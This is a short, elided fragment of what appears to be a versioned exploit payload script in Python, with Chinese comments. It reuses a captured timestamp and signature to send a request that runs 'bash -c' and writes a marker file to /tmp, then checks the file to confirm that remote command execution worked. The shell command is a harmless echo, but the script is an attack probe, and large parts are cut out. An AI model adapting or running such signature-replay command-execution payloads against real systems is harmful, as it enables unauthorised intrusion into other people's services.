# -*- coding: utf-8 -*-
"""v212 payload: 修复时序(先 hook 后探测) + 完整错误信息
...
def classify(resp):
    if resp.startswith(b'EXC:') or resp.startswith(b'RECVEXC'):
        return 'EXC'
...
if captured:
    ts, sig = captured[0]
    body = build_body('bash', ['-c', 'echo V212-CTRL-OK > /tmp/v212_ctrl'])
    ...
    try:
        if os.path.exists('/tmp/v212_ctrl'):
            log('FILE /tmp/v212_ctrl EXISTS: %r' % open('/tmp/v212_ctrl').read())
        else:
            log('FILE /tmp/v212_ctrl MISSING')
    except Exception as e:
        log('FILE EXC %s' % e)
log('V212_DONE')
f.close()
